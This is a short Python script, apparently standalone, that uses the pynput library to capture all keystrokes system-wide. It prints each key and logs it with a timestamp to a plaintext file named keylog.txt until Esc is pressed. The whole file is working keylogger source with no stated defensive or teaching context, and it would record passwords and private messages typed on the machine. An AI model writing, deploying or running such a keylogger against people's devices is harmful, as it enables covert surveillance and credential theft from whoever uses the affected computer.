from pynput.keyboard import Key, Listener
import logging

logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        print(f"Key pressed: {key.char}")
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        print(f"Special key: {key}")
        logging.info(f"Special key: {key}")

def on_release(key):
    return False if key == Key.esc else True

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
